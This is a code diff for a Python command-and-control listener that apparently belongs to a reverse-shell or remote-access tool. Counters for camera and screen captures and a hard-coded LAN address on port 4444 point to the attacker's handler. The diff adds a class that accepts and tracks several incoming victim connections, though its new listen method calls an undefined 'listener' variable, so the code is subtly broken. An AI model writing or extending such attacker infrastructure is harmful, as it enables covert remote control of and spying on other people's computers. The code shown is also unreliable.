@@ -3,9 +3,7 @@ import termcolor
 import base64
 
 
-class Listener:
-	cam_count = 0 
-	src_count = 0
+class ListenerOld:
 
 	def __init__(self, ip, port):
 		listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -15,6 +13,9 @@ class Listener:
 		print("[+] Waiting for incoming connections")
 		self.connection, address = listener.accept()
 		print("[+] Got a connection from " + str(address))
+
+		self.cam_count = 0 
+		self.src_count = 0
 
 	def reliable_send(self, data):
 		json_data = json.dumps(data)
@@ -83,5 +84,31 @@ class Listener:
 				# print("[-] Something was wrong!")
 
 
-my_listener = Listener("192.168.0.104", 4444)
-my_listener.run()
+class Listener:
+
+	def __init__(self, ip, port):
+		self.connections = []
+
+		self.listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+		self.listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+		self.listener.bind((ip, port))
+
+
+	def listen(self):
+		print("[+] Waiting for incoming connections")
+		while True:
+			listener.listen(0)
+			connection, address = listener.accept()
+			print("[+] Got a connection from " + str(address))
+			self.connections.append((connection, address))
+			self.printConnections()
+
+
+	def printConnections(self):
+		for con in self.connections:
+			print(con[0], con[1])
+
+
+
+my_listener = Listener("192.168.0.108", 4444)
+my_listener.listen()
